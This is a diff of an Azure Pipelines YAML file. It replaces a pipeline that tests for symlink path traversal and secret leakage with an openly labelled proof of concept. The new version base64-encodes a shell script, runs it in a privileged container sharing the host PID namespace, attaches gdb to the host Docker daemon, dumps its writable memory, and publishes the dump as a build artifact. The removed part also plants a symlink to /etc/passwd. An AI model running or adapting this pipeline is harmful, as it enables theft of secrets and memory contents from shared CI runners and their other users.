@@ -1,143 +1,55 @@
-name: $(Date:yyyyMMdd).$(Rev:.r)
+# A minimal Azure Pipeline to perform a surgical memory dump of the host Docker daemon.
+# This runs on a standard Microsoft-hosted agent.
 
+name: Docker Daemon Memory Dump PoC $(Date:yyyyMMdd).$(Rev:.r)
 trigger:
-  branches:
-    include: [main]
+- main
 
-pr:
-  branches:
-    include: [main]
+pool:
+  vmImage: ubuntu-22.04
 
-variables:
-  ARTIFACT_DIR_SYMLINK: '$(Build.SourcesDirectory)/artifacts-symlink'
-  ARTIFACT_DIR_TOOLCACHE: '$(Build.SourcesDirectory)/artifacts-toolcache'
-  ARTIFACT_DIR_ARGV: '$(Build.SourcesDirectory)/artifacts-argv'
-  SYMLINK_TGZ: 'symlink_payloads.tgz'
+steps:
+- checkout: none # We don't need any source code for this task.
 
-stages:
-- stage: BuildAndPublish
-  displayName: 'Build, seed, and publish'
-  jobs:
-  - job: ubuntu
-    displayName: 'Ubuntu 22.04'
-    pool:
-      vmImage: ubuntu-22.04
-    steps:
-    - checkout: self
-      clean: true
+- task: Bash@3
+  displayName: 'Attempt Host Docker Daemon Memory Dump'
+  inputs:
+    targetType: 'inline'
+    script: |
+      set -e
+      DOCKER_DUMP_TGZ="dockerd_memory_dump.tar.gz"
 
-    - task: Bash@3
-      displayName: 'Seed: identify, symlinks, toolcache, and secret init'
-      env:
-        DUMMY_SECRET: $(DUMMY_SECRET)
-      inputs:
-        targetType: 'inline'
-        script: |
-          set -euo pipefail
-          echo "== Host identity & timing =="; date -u; uname -a; id
+      echo "### [1] Preparing surgical memory dump script... ###"
+      DUMP_SCRIPT=$(cat <<'EOF'
+        # This script runs inside the privileged container on the runner host.
+        echo '--- [ATTACK_CONTAINER] Installing prerequisites (gdb, procps)... ---'
+        apk add --no-cache gdb procps
 
-          echo "== Prepare artifacts tree =="
-          mkdir -p "$(ARTIFACT_DIR_SYMLINK)/deep/inside" "$(ARTIFACT_DIR_TOOLCACHE)" "$(ARTIFACT_DIR_ARGV)"
-          echo "MARK_$(Build.BuildId) $(Build.Repository.Provider) $(Build.SourceVersion)" | tee "$(ARTIFACT_DIR_TOOLCACHE)/MARK.txt"
+        echo '--- [ATTACK_CONTAINER] Finding host Docker Daemon PID... ---'
+        DOCKER_PID=$(pgrep -o dockerd)
+        if [ -n "$DOCKER_PID" ]; then
+          echo "--- [ATTACK_CONTAINER] Found dockerd at PID $DOCKER_PID. Dumping memory... ---"
+          mkdir -p /workspace/memory_dump
+          awk '/rw-p/ {split($1,a,"-"); print "dump memory /workspace/memory_dump/" a[1] "-" a[2] ".mem 0x" a[1] " 0x" a[2]}' /proc/$DOCKER_PID/maps > /workspace/gdb_commands.txt
+          gdb -p $DOCKER_PID -batch -x /workspace/gdb_commands.txt
+          echo '--- [ATTACK_CONTAINER] Memory dump complete. Creating archive... ---'
+          tar -czf /workspace/dockerd_memory_dump.tar.gz -C /workspace/memory_dump .
+        else
+          echo '--- [ATTACK_CONTAINER] CRITICAL FAILURE: Could not find dockerd process. ---'
+          exit 1
+        fi
+      EOF
+      )
+      ENCODED_SCRIPT=$(echo "${DUMP_SCRIPT}" | base64 -w 0)
+      echo "✅ Dump script prepared and encoded."
 
-          echo "== Symlink payloads =="
-          cd "$(ARTIFACT_DIR_SYMLINK)/deep/inside"
-          ln -s ../../../../../etc/passwd rel_escape_to_etc_passwd
-          cd "$(ARTIFACT_DIR_SYMLINK)"
-          find . -maxdepth 3 -type l -ls | tee "$(ARTIFACT_DIR_SYMLINK)/MANIFEST.txt"
+      echo -e "\n### [2] Executing payload on the runner host... ###"
+      docker run --rm --privileged --pid=host -v "$(Build.SourcesDirectory):/workspace" alpine:latest sh -c \
+        "echo ${ENCODED_SCRIPT} | base64 -d | sh"
+      echo -e "\n### [3] Payload execution finished. ###"
 
-          echo "== Pack the symlink payloads (don’t dereference) =="
-          tar -C "$(ARTIFACT_DIR_SYMLINK)" -czf "$(Build.SourcesDirectory)/$(SYMLINK_TGZ)" .
-          ls -l "$(Build.SourcesDirectory)/$(SYMLINK_TGZ)"
-
-          echo "== Toolcache seed (no elevation) =="
-          echo "AGENT_TOOLSDIRECTORY=$AGENT_TOOLSDIRECTORY"
-          for d in /var/tmp /tmp "$AGENT_TOOLSDIRECTORY" /usr/local/share ; do
-            if [ -w "$d" ]; then
-              date -Iseconds > "$d/.MARK_$(Build.BuildId)" || true
-            else
-              echo "no perms for $d" | tee -a "$(ARTIFACT_DIR_TOOLCACHE)/MARK.txt"
-            fi
-          done
-
-          echo "== Secret handling demo (no ARGV leak) =="
-          set +x
-          test -n "$DUMMY_SECRET"
-          sleep 1
-          if ps auxww | grep -F -- "$DUMMY_SECRET" | grep -v grep > "$(ARTIFACT_DIR_ARGV)/ps_secret_matches.txt"; then
-            echo "ERROR: secret string appeared in process args" | tee "$(ARTIFACT_DIR_ARGV)/RESULT.txt"
-            exit 1
-          else
-            echo "OK: secret not found in process args" | tee "$(ARTIFACT_DIR_ARGV)/RESULT.txt"
-          fi
-
-          echo "== Summaries =="
-          cp "$(Build.SourcesDirectory)/$(SYMLINK_TGZ)" "$(ARTIFACT_DIR_SYMLINK)/"
-
-    - task: PublishPipelineArtifact@1
-      displayName: 'Publish: toolcache proof'
-      inputs:
-        targetPath: $(ARTIFACT_DIR_TOOLCACHE)
-        artifact: toolcache-proof
-
-    - task: PublishPipelineArtifact@1
-      displayName: 'Publish: symlink payloads (as .tgz)'
-      inputs:
-        targetPath: $(Build.SourcesDirectory)/$(SYMLINK_TGZ)
-        artifact: symlink-proof
-
-    - task: PublishPipelineArtifact@1
-      displayName: 'Publish: argv leak proof'
-      inputs:
-        targetPath: $(ARTIFACT_DIR_ARGV)
-        artifact: argv-leak-proof
-
-- stage: ConsumeAndValidate
-  displayName: 'Download and safely extract symlink tarball'
-  dependsOn: BuildAndPublish
-  jobs:
-  - job: validate
-    displayName: 'Validate safe extraction on Ubuntu'
-    pool:
-      vmImage: ubuntu-22.04
-    steps:
-    - task: DownloadPipelineArtifact@2
-      displayName: 'Download symlink-proof'
-      inputs:
-        buildType: current
-        artifact: symlink-proof
-        path: $(Pipeline.Workspace)/dl
-
-    - task: Bash@3
-      displayName: 'Safe extractor & path traversal check'
-      inputs:
-        targetType: 'inline'
-        script: |
-          set -euo pipefail
-          tgz="$(Pipeline.Workspace)/dl/$(SYMLINK_TGZ)"
-          dest="$(Build.SourcesDirectory)/unpack"
-          mkdir -p "$dest"
-          echo "Extracting to: $dest"
-
-          tar --extract \
-            --file "$tgz" \
-            --directory "$dest" \
-            --no-same-owner \
-            --no-overwrite-dir \
-            --keep-old-files
-
-          echo "Validating paths stay within $dest"
-          tar -tzf "$tgz" | sed 's#^\./##' | while IFS= read -r path; do
-            rp=$(realpath -m "$dest/$path")
-            case "$rp" in "$dest"/*) : ;; *)
-              echo "Path escape detected: $path -> $rp" >&2
-              exit 1
-            esac
-          done
-          echo "OK: no path escapes" | tee "$(Build.SourcesDirectory)/safe-extraction.txt"
-
-    - task: PublishPipelineArtifact@1
-      displayName: 'Publish: extractor results'
-      inputs:
-        targetPath: $(Build.SourcesDirectory)/safe-extraction.txt
-        artifact: extractor-proof
+- task: PublishPipelineArtifact@1
+  displayName: 'Publish: Docker Daemon Memory Dump'
+  inputs:
+    targetPath: $(Build.SourcesDirectory)/dockerd_memory_dump.tar.gz
+    artifact: dockerd-memory-dump
